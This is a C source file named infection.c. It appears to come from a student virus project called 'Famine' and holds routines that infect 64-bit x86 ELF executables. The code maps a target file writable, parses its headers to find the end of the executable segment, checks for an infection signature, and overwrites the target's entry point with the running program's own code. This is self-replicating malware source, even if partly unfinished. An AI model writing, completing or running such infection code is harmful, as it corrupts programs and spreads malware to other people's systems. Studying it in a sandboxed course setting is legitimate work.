/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/04 10:50:22 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

static bool		parsing(byte *file, const struct stat file_stat, elf_data *data);
static size_t	off_end_exec_segment(elf_data *data);

#define	CODE_SIZE		0xa6b - 0x30 + 1

//	Infects the file located at path
//
//	Returns true on a critical error that needs to stop the whole infection program
bool	infect(const str path) {
	int64_t		fd;
	int64_t		ret;
	struct stat file_stat = {0};
	byte		*file_origin = NULL;
	elf_data	data;
	uint64_t	rip;

	(void)fd;
	(void)ret;

	open(fd, path, O_RDWR);

	fstat(ret, fd, &file_stat);
	if (ret)
		printf(FILE_LINE("fstat failed: %ld\n"), ret);

	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
		goto infect_end;

	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	close(fd);
	if (file_origin == MAP_FAILED)
		printf(FILE_LINE("fstat failed: %p\n"), file_origin);

	// Logic starts
	if (parsing(file_origin, file_stat, &data) == false)
		goto infect_end;
	
	// ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
	get_rip(rip);

	// To change
	rip = rip & 0xfffffffff000;
	rip += 0x30;

	ft_memcpy(file_origin + data.elf->e_entry, (byte *)rip, CODE_SIZE);

	printf("memcpy(%p + 0x%04lx, 0x%lx, %x)\n", file_origin, data.elf->e_entry, rip, CODE_SIZE);

	// Logic ends
	infect_end:
	munmap(ret, file_origin, file_stat.st_size);

	return false;
}

//	Check if the file is compatible for infection and parses the required data
//		in the elf_data *data argument
//
//	Returns true if it's compatible
//	Returns false if it's not
static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
	(void)file_stat;

	if (((uint32_t *)file)[0] != 0x464c457f)
		return false;

	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
		return false;

	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64)
		return false;

	data->file = file;
	data->elf = (Elf64_Ehdr *)file;
	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
	data->signature_offset = off_end_exec_segment(data);
	data->infection_offset = data->signature_offset + SIGNATURE_LEN;

	if (ft_memcmp((const byte *)SIGNATURE, file + data->signature_offset, SIGNATURE_LEN) == true)
		return false;

	return true;
}

//	Returns the offset of the last byte of data in the code segment
//
//	Returns 0 on error
static size_t	off_end_exec_segment(elf_data *data) {
	size_t		offset = 0;
	size_t		exec_begin = 0, exec_end = 0;
	Elf64_Shdr	*section = NULL;
	Elf64_Phdr	*segment = NULL;

	for (size_t i = 0; i < data->elf->e_shnum; i++) {
		section = &data->sections[i];

		if (ft_memcmp((byte *)".text",
				data->file + data->sections[data->elf->e_shstrndx].sh_offset + section->sh_name,
				6)
			== true)
		{
			for (i = 0; i < data->elf->e_phnum; i++) {
				segment = &data->segments[i];
				size_t	segment_end = segment->p_offset + segment->p_filesz;

				if (segment_end % segment->p_align != 0)
					segment_end += segment->p_align - (segment_end % segment->p_align);


				//	printf("Range: %lx - %lx <=> %lx - %lx | type: %d | flags: %d == %d ?\n",
				//		segment->p_offset, segment_end,
				//		section->sh_offset, section->sh_offset + section->sh_size,
				//		segment->p_type, segment->p_flags, (PF_X | PF_R));

				if (segment->p_type == PT_LOAD &&
					(segment->p_flags == (PF_X | PF_R)) &&
					segment->p_offset <= section->sh_offset &&
					segment_end > (section->sh_offset + section->sh_size))
				{
					exec_begin = segment->p_offset;
					exec_end = segment_end;
					break;
				}
			}
			break;
		}
	}

	for (size_t i = 0; i < data->elf->e_shnum; i++) {
		section = &data->sections[i];

		//	printf("Range: %lx - %lx\n", section->sh_offset, section->sh_offset + section->sh_size);
		if (section->sh_offset >= exec_begin &&
			section->sh_offset + section->sh_size < exec_end &&
			section->sh_offset + section->sh_size > offset)
		{
			offset = section->sh_offset + section->sh_size;
		}
	}

	return offset;
}
